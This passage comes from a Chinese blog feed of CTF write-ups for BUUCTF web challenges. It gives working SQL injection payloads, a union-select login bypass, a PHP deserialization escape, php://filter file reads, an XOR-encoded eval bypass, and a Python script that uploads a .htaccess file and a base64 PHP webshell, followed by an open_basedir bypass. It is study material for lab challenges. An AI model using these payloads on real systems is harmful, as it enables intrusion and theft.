class="highlight lisp"><table><tr><td class="code"><pre><span class="line">readfile(<span class="name">array_rand</span>(<span class="name">array_flip</span>(<span class="name">scandir</span>(<span class="name">current</span>(<span class="name">localeconv</span>())))))<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>即可随机读取到<code>flag</code></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200226170031.png" alt=""></p><h1 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h1><p>这里刚做了一个<code>Sqli</code>的<code>Fuzz</code>字典，包括了<code>mysql</code>所有的关键字和函数和操作符</p><p>这关过滤了空格、and、union</p><p>那就先看看数据库名</p><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">/check.php</span><br><span class="line">?username=admin'or(extractvalue(<span class="number">0x0a</span>,concat(<span class="number">0x0a</span>,(select(database())))))%<span class="number">23</span></span><br><span class="line">&amp;password=<span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200226192331.png" alt=""></p><p>然后爆表名</p><figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">/check.php</span><br><span class="line">?username=1'or(extractvalue(0x0a,concat(0x0a,(<span class="keyword">select</span>(group_concat(table_name))<span class="keyword">from</span>(information_schema.tables)<span class="keyword">where</span>(table_schema)<span class="keyword">LIKE</span>(<span class="keyword">database</span>())))))%<span class="number">23</span></span><br><span class="line">&amp;<span class="keyword">password</span>=<span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200226193617.png" alt=""></p><p>然后字段名</p><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">/check.php</span><br><span class="line">?username=<span class="number">1</span>'or(extractvalue(<span class="number">0x0a</span>,concat(<span class="number">0x0a</span>,(select(group_concat(column_name))from(information_schema.columns)where(table_name)LIKE(<span class="string">"H4rDsq1"</span>)))))%<span class="number">23</span></span><br><span class="line">&amp;password=<span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200226195038.png" alt=""></p><p>然后测试得到<code>flag</code>在<code>password</code>字段</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200226195532.png" alt=""></p><p>但只有前半截</p><p>那就先用<code>left</code>函数读取前半部</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200226195746.png" alt=""></p><p>然后用<code>right</code>函数读后半截即可</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200226195832.png" alt=""></p><p>组合得到<code>flag</code></p><h1 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h1><p>这里查询解密给了一段注释</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200226201605.png" alt=""></p><p>先<code>base32</code>后<code>base64</code>解码得到这个</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200226201617.png" alt=""></p><p>得到注入点</p><p>然后看一下过滤，过滤了or（大写绕过）、</p><p>先看字段数一共三列</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200226204249.png" alt=""></p><p>这里要判断用户名的字段位置，发现在第二个位置填<code>admin</code>时不会报错，其他位置会报错</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200226214308.png" alt=""></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200226214245.png" alt=""></p><p>可以判断第一二三个位置分别为<code>id、username、password</code></p><p>用<code>Sqlmap</code>跑一下</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200226221136.png" alt=""></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200226221620.png" alt=""></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200226222425.png" alt=""></p><p>但这个哈希解不开</p><p>剩下的我看别的师傅WP提到对比哈希，但我这里没有任何提示</p><p>但<code>union select</code>有个特性，当查询的信息不存在时，他会暂时新建一个新的数据，如下：</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200226223101.png" alt=""></p><p>这时候可以我们自己生成一个哈希，然后用我们的密码进行登录</p><blockquote><p>name=1’ union select 0,’admin’,’202cb962ac59075b964b07152d234b70’%23</p><p>&amp;pw=123</p></blockquote><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200226223134.png" alt=""></p><h1 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$function = @$_GET[<span class="string">'f'</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($img)</span></span>&#123;</span><br><span class="line">    $filter_arr = <span class="keyword">array</span>(<span class="string">'php'</span>,<span class="string">'flag'</span>,<span class="string">'php5'</span>,<span class="string">'php4'</span>,<span class="string">'fl1g'</span>);</span><br><span class="line">    $filter = <span class="string">'/'</span>.implode(<span class="string">'|'</span>,$filter_arr).<span class="string">'/i'</span>;</span><br><span class="line">    <span class="keyword">return</span> </span><br><span class="line">      ($filter,<span class="string">''</span>,$img);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SESSION)&#123;</span><br><span class="line">    <span class="keyword">unset</span>($_SESSION);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">"user"</span>] = <span class="string">'guest'</span>;</span><br><span class="line">$_SESSION[<span class="string">'function'</span>] = $function;</span><br><span class="line"></span><br><span class="line">extract($_POST);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$function)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;a href="index.php?f=highlight_file"&gt;source_code&lt;/a&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">'img_path'</span>])&#123;</span><br><span class="line">    $_SESSION[<span class="string">'img'</span>] = base64_encode(<span class="string">'guest_img.png'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $_SESSION[<span class="string">'img'</span>] = sha1(base64_encode($_GET[<span class="string">'img_path'</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$serialize_info = filter(serialize($_SESSION));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($function == <span class="string">'highlight_file'</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">'index.php'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">'phpinfo'</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'phpinfo();'</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">'show_image'</span>)&#123;</span><br><span class="line">    $userinfo = unserialize($serialize_info);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode($userinfo[<span class="string">'img'</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>给了源码，是<code>SESSION</code>反序列化的题目</p><p>提示要看<code>phpinfo</code>，这里看到了被包含的<code>flag</code>文件</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200227180359.png" alt=""></p><p>接下来是反序列化读文件即可，但这里要读取的<code>img</code>被<code>SHA1</code>后不可读</p><p>那么就要想办法使得<code>img</code>可控为我们需要的<code>d0g3_f1ag.php</code>的<code>Base64</code>为<code>ZDBnM19mMWFnLnBocA==</code></p><p>这道题和之前做过的那个<code>piapiapia</code>很相似（应该是那个</p><p>那个是通过增长反序列化字符串长度从而导致溢出</p><p>这个是用过滤实现字符串变短，但<code>s:(len)</code>不变导致往后读取</p><p>由于存在<code>extract($_POST)</code>，使得我们可以控制<code>$_SESSION</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($img)</span></span>&#123;</span><br><span class="line">$filter_arr = <span class="keyword">array</span>(<span class="string">'php'</span>,<span class="string">'flag'</span>,<span class="string">'php5'</span>,<span class="string">'php4'</span>,<span class="string">'fl1g'</span>);</span><br><span class="line">$filter = <span class="string">'/'</span>.implode(<span class="string">'|'</span>,$filter_arr).<span class="string">'/i'</span>;</span><br><span class="line"><span class="keyword">return</span> preg_replace($filter,<span class="string">''</span>,$img);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">"user"</span>] = <span class="string">''</span>;</span><br><span class="line">$_SESSION[<span class="string">'function'</span>] = <span class="string">''</span>;</span><br><span class="line">$_SESSION[<span class="string">'img'</span>] = <span class="string">'ZDBnM19mMWFnLnBocA=='</span>;</span><br><span class="line"></span><br><span class="line">var_dump($_SESSION);</span><br><span class="line">$a = filter(serialize($_SESSION));</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="comment">//$s = unserialize($a);</span></span><br><span class="line"><span class="comment">//var_dump($s);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里先得到我们<code>img</code>的序列化字段</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">s:<span class="number">3</span>:<span class="string">"img"</span>;s:<span class="number">20</span>:<span class="string">"ZDBnM19mMWFnLnBocA=="</span></span><br></pre></td></tr></table></figure><p>这里由于<code>$_SESSION[’img&#39;]</code>替换在序列化之前，所以说我们不能让<code>$_SESSION[’img&#39;]</code>出现在序列化的变量中</p><p>但却要求反序列化后出现<code>$_SESSION[’img&#39;]</code></p><p>那就需要想办法利用反序列化在对序列化对象长度达到长度并且被完整地<code>}</code>包裹后</p><p>他就会忽略后面的部分反序列化对象</p><p>就比如我们现在任意传入一个反序列化字符串</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200227185604.png" alt=""></p><p>此时我们需要将<code>s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;</code>给反序列化，把<code>img_jiade</code>那一串给截断</p><p>就得拿<code>$_SESSION[&#39;function&#39;]</code>入手</p><p>这里j讲一下反序列化中一组变量的字符串形式构成：</p><blockquote><p><code>s:变量名长度:&quot;变量名&quot;;s:&quot;变量长度&quot;:s&quot;变量&quot;;</code></p></blockquote><p>这里不一定是<code>s</code>，即字符串，也可以是其他比如数组<code>a</code>之类的，只不过数组需要<code>{}</code>包裹而已，使用时需要修改</p><p>此时如果<code>$_SESSION[&#39;function&#39;] = &#39;a&#39;</code>时</p><p>他的序列化结果为：</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200227190116.png" alt=""></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">s:<span class="number">8</span>:<span class="string">"function"</span>;s:<span class="number">1</span>:<span class="string">"a"</span>;</span><br></pre></td></tr></table></figure><p>此时我们可以在后面跟上我们的真正的<code>img</code>的序列化结果</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">s:<span class="number">8</span>:<span class="string">"function"</span>;s:<span class="number">1</span>:<span class="string">"a"</span>;s:<span class="number">3</span>:<span class="string">"img"</span>;s:<span class="number">20</span>:<span class="string">"ZDBnM19mMWFnLnBocA=="</span>;</span><br></pre></td></tr></table></figure><p>此时为了吞掉<code>function</code>的序列化结果，我们可以利用过滤来处理<code>user</code>的序列化值</p><p>比如现在设置<code>$_SESSION[&quot;user&quot;] = &#39;flagflagflagflag&#39;</code></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200227190455.png" alt=""></p><p>会导致<code>flag</code>被替换掉，他的值为空，但是反序列化还得继续哇</p><p>他会尝试读取16长度的后半部分字符，如果后半部分满足反序列化的条件，即变量数等于3，反序列化结果以<code>}</code>结尾，他就会反序列化成功</p><blockquote><p>注意！反序列化会将双引号算作一个字符！！</p></blockquote><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200227190937.png" alt=""></p><p>我们来计算一下下面字符串的长度</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">";s:8:"</span><span class="function"><span class="keyword">function</span>"</span>;s:<span class="number">59</span>:<span class="string">"a</span></span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200227191031.png" alt=""></p><p>那我们需要构造6个<code>flag</code>从而可以吞并这部分</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($img)</span></span>&#123;</span><br><span class="line">$filter_arr = <span class="keyword">array</span>(<span class="string">'php'</span>,<span class="string">'flag'</span>,<span class="string">'php5'</span>,<span class="string">'php4'</span>,<span class="string">'fl1g'</span>);</span><br><span class="line">$filter = <span class="string">'/'</span>.implode(<span class="string">'|'</span>,$filter_arr).<span class="string">'/i'</span>;</span><br><span class="line"><span class="keyword">return</span> preg_replace($filter,<span class="string">''</span>,$img);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">"user"</span>] = <span class="string">'flagflagflagflagflagflag'</span>;</span><br><span class="line">$_SESSION[<span class="string">'function'</span>] = <span class="string">'a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:1:"a";s:1:"a";&#125;'</span>;</span><br><span class="line">$_SESSION[<span class="string">'img_jiade'</span>] = <span class="string">'ZDBnM19mMWFnLnBocA=='</span>;</span><br><span class="line"></span><br><span class="line">var_dump($_SESSION);</span><br><span class="line">$a = filter(serialize($_SESSION));</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line">$s = unserialize($a);</span><br><span class="line">var_dump($s);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>此时过滤后的序列化结果为</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">"user"</span>;s:<span class="number">24</span>:<span class="string">""</span>;s:<span class="number">8</span>:<span class="string">"function"</span>;s:<span class="number">41</span>:<span class="string">"a"</span>;s:<span class="number">3</span>:<span class="string">"img"</span>;s:<span class="number">20</span>:<span class="string">"ZDBnM19mMWFnLnBocA=="</span>;<span class="string">";s:9:"</span>img_jiade<span class="string">";s:20:"</span>ZDBnM19mMWFnLnBocA==<span class="string">";&#125;</span></span><br></pre></td></tr></table></figure><p>但还是反序列化没结果，原因是现在由于前面<code>a:3</code>需要存在三个变量，我们在后面再给他构造一个，记得用<code>;</code>和<code>}</code>来结束</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">s:<span class="number">1</span>:<span class="string">"a"</span>;s:<span class="number">1</span>:<span class="string">"a"</span>;&#125;</span><br></pre></td></tr></table></figure><p>![image-20200227194420722](/Users/a2u13/Library/Application Support/typora-user-images/image-20200227194420722.png)</p><p>可以看到成功逃逸出来，我们插入了本不应该在序列化字符串中存在的<code>img</code></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200227195415.png" alt=""></p><p>得到<code>flag</code>的地方<code>/d0g3_fllllllag</code>，<code>base64</code>编码一下<code>L2QwZzNfZmxsbGxsbGFn</code>，长度刚好20，把编码后的替换一下即可得到<code>flag</code></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200227200127.png" alt=""></p><h1 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h1><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200227200645.png" alt=""></p><p>很简单文件包含，没任何过滤，直接用<code>php://filter</code>读即可</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200227200721.png" alt=""></p><p>解码得到<code>flag</code></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200227200744.png" alt=""></p><h1 id="SUCTF-2019-EasyWeb"><a href="#SUCTF-2019-EasyWeb" class="headerlink" title="[SUCTF 2019]EasyWeb"></a>[SUCTF 2019]EasyWeb</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    $userdir = <span class="string">"upload/tmp_"</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!file_exists($userdir))&#123;</span><br><span class="line">    mkdir($userdir);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">"file"</span>]))&#123;</span><br><span class="line">        $tmp_name = $_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line">        $name = $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">        $extension = substr($name, strrpos($name,<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/ph/i"</span>,$extension)) <span class="keyword">die</span>(<span class="string">"^_^"</span>); </span><br><span class="line">        <span class="keyword">if</span>(mb_strpos(file_get_contents($tmp_name), <span class="string">'&lt;?'</span>)!==<span class="keyword">False</span>) <span class="keyword">die</span>(<span class="string">"^_^"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!exif_imagetype($tmp_name)) <span class="keyword">die</span>(<span class="string">"^_^"</span>); </span><br><span class="line">        $path= $userdir.<span class="string">"/"</span>.$name;</span><br><span class="line">        @move_uploaded_file($tmp_name, $path);</span><br><span class="line">        print_r($path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$hhh = @$_GET[<span class="string">'_'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$hhh)&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen($hhh)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'One inch long, one inch strong!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span>, $hhh) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Try something else!'</span>);</span><br><span class="line"></span><br><span class="line">$character_type = count_chars($hhh, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($character_type)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">"Almost there!"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>($hhh);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>给了源代码，分为两个部分</p><h2 id="get-the-flag函数"><a href="#get-the-flag函数" class="headerlink" title="get_the_flag函数"></a>get_the_flag函数</h2><p>用来上传文件，其中过滤都很熟悉，不容许上传<code>ph</code>开头的后缀文件</p><p>不容许上传包括<code>&lt;?</code>开头的文件</p><p>还有<code>exif_imagetype</code>检查</p><p>下面讲绕过姿势</p><h3 id="ph后缀绕过"><a href="#ph后缀绕过" class="headerlink" title="ph后缀绕过"></a>ph后缀绕过</h3><p>这里可以试试上传<code>.htaccess</code>或者<code>.user.ini</code>来改解析</p><p>然后上传正常图片文件来解析成<code>php</code>文件来执行</p><h3 id="lt-内容绕过"><a href="#lt-内容绕过" class="headerlink" title="&lt;?内容绕过"></a>&lt;?内容绕过</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">langeuage</span>=<span class="string">'php'</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>($_POST[<span class="string">'a2u13'</span>]);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>只适用于php7一下版本</p><p>这里可以通过<code>php://filter</code>来解读编码后的数据</p><h3 id="exif-imagetype绕过"><a href="#exif-imagetype绕过" class="headerlink" title="exif_imagetype绕过"></a>exif_imagetype绕过</h3><p>对于图片文件等加上<code>GIF89a</code>幻数即可绕过</p><p>但是对于<code>.htaccess</code>文件来说加上这个不解析</p><p>所以得专门针对<code>.htaccess</code>绕过</p><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="number">#def</span>ine <span class="attribute">width</span> <span class="number">1337</span></span><br><span class="line"><span class="number">#def</span>ine <span class="attribute">height</span> <span class="number">1337</span> </span><br><span class="line">AddType application/x-httpd-php .a</span><br><span class="line">php_value auto_append_file <span class="string">"php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_xxxxxx/shell.a"</span></span><br></pre></td></tr></table></figure><p>对于要解析的那个文件，加上<code>GIF86a</code>的同时得补足8字节，否则会导致<code>base64</code>把后面的编码部分给解码错了</p><p>所以我们要上传的<code>a2u13.a</code>文件内容如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89axx</span><br><span class="line">PD9waHAgZXZhbCgkX0dFVFsnYSddKTsgPz4=</span><br></pre></td></tr></table></figure><h2 id="命令执行部分"><a href="#命令执行部分" class="headerlink" title="命令执行部分"></a>命令执行部分</h2><p>这里给正则fuzz了一下，过了出了可用字符</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>($hhh=<span class="number">32</span>;$hhh&lt;=<span class="number">126</span>;$hhh++)&#123;</span><br><span class="line"><span class="keyword">if</span> ( !preg_match(<span class="string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span>, chr($hhh)) )&#123;</span><br><span class="line"><span class="keyword">echo</span> chr($hhh);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>结果如下:</p><figure class="highlight clean"><table><tr><td class="code"><pre><span class="line">!#$%()*+-/:;&lt;&gt;?@\]^&#123;&#125;</span><br></pre></td></tr></table></figure><p>能用的就这几个，这里可以参考P牛的无字母数字getshell这篇文章</p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p><p>有三个方法：</p><ul><li>异或</li><li>取反</li><li>弱类型强制转换</li><li>自增</li></ul><p>但这里过滤了<code>~</code>，导致不能取反，而且也有长度限制，不能自增</p><p>这里只能使用异或大法了</p><p>这里直接构造<code>get_the_flag</code>会长度超过限制</p><p>所以可以构造<code>$_GET{a}()</code>，其中<code>a=get_the_flag</code>的方式来调用<code>get_the_flag()</code>函数</p><p>这里找了个脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">find = [<span class="string">'G'</span>,<span class="string">'E'</span>,<span class="string">'T'</span>,<span class="string">'_'</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">256</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">256</span>):</span><br><span class="line">        result = chr(i^j)</span><br><span class="line">        <span class="keyword">if</span>(result <span class="keyword">in</span> find):</span><br><span class="line">            a = i.to_bytes(<span class="number">1</span>,byteorder=<span class="string">'big'</span>)</span><br><span class="line">            b = j.to_bytes(<span class="number">1</span>,byteorder=<span class="string">'big'</span>)</span><br><span class="line">            a = urllib.parse.quote(a)</span><br><span class="line">            b = urllib.parse.quote(b)</span><br><span class="line">            print(<span class="string">"%s:%s^%s"</span>%(result,a,b))</span><br></pre></td></tr></table></figure><figure class="highlight cos"><table><tr><td class="code"><pre><span class="line">_:<span class="built_in">%FF</span><span class="symbol">^%A0</span></span><br><span class="line">T:<span class="built_in">%FF</span><span class="symbol">^%AB</span></span><br><span class="line">G:<span class="built_in">%FF</span><span class="symbol">^%B8</span></span><br><span class="line">E:<span class="built_in">%FF</span><span class="symbol">^%BA</span></span><br></pre></td></tr></table></figure><p>然后构造<code>/?_=$花括号%FF%FF%FF%FF^%A0%B8%BA%AB花括号花括号%FF花括号();&amp;%FF=get_the_flag</code>即可</p><p>这里<code>hexo</code>标签问题不能用<code>{}</code>包裹，否则生成文件会出错。。。</p><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>然后上传</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">session = requests.session()</span><br><span class="line">url = <span class="string">"http://1df5ccd8-384f-4d4a-b111-e6b095e90311.node3.buuoj.cn/?_=$&#123;%FF%FF%FF%FF^%A0%B8%BA%AB&#125;&#123;%FF&#125;();&amp;%FF=get_the_flag"</span></span><br><span class="line"></span><br><span class="line">ma = <span class="string">b"GIF89a12"</span> + base64.b64encode(<span class="string">b"&lt;?php eval($_REQUEST['a']);?&gt;"</span>)</span><br><span class="line"></span><br><span class="line">htaccess = <span class="string">b'''</span></span><br><span class="line"><span class="string">#define width 1337</span></span><br><span class="line"><span class="string">#define height 1337 </span></span><br><span class="line"><span class="string">AddType application/x-httpd-php .aa</span></span><br><span class="line"><span class="string">php_value auto_append_file "php://filter/convert.base64-decode/resource=a2u13.aa"</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">ma_file = &#123;</span><br><span class="line">    <span class="string">"file"</span>:(<span class="string">"a2u13.aa"</span>,ma,<span class="string">'image/gif'</span>)</span><br><span class="line">&#125;</span><br><span class="line">htaccess_file = &#123;</span><br><span class="line">    <span class="string">"file"</span>:(<span class="string">'.htaccess'</span>,htaccess,<span class="string">'image/jpeg'</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">c = session.post(url=url,files=ma_file).text</span><br><span class="line"></span><br><span class="line">print(c)</span><br><span class="line"></span><br><span class="line">c = session.post(url=url,files=htaccess_file).text</span><br><span class="line"></span><br><span class="line">print(c)</span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200228190549.png" alt=""></p><p>然后搜了一下<code>flag</code>竟然直接搜到<code>flag</code>了。。。。</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200228190623.png" alt=""></p><p>不过好像是非预期</p><p>正常的话好像过滤了命令执行函数<code>system</code>等等</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200228191035.png" alt=""></p><p>得依靠<code>file_get_contents</code>等函数来读</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200228191112.png" alt=""></p><p>这里限制了<code>open_basedir</code>，得绕过去</p><p><a href="https://xz.aliyun.com/t/4720" target="_blank" rel="noopener">https://xz.aliyun.com/t/4720</a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">chdir(<span class="string">'img'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/'</span>);<span class="keyword">echo</span>(scandir(<span class="string">"/"</span>));</span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200228191331.png" alt=""></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">chdir(<span class="string">'img'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/'</span>);var_dump(file_get_contents(<span class="string">"/THis_Is_tHe_F14g"</span>));</span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200228191518.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200212161847.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;题目列表：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;[极客大挑战 2019]Upload&lt;/li&gt;
&lt;li&gt;[CISCN 2019 初赛]Love Math&lt;/li&gt;
&lt;li&gt;[GXYCTF2019]禁止套娃&lt;/li&gt;
&lt;li&gt;[极客大挑战 2019]HardSQL&lt;/li&gt;
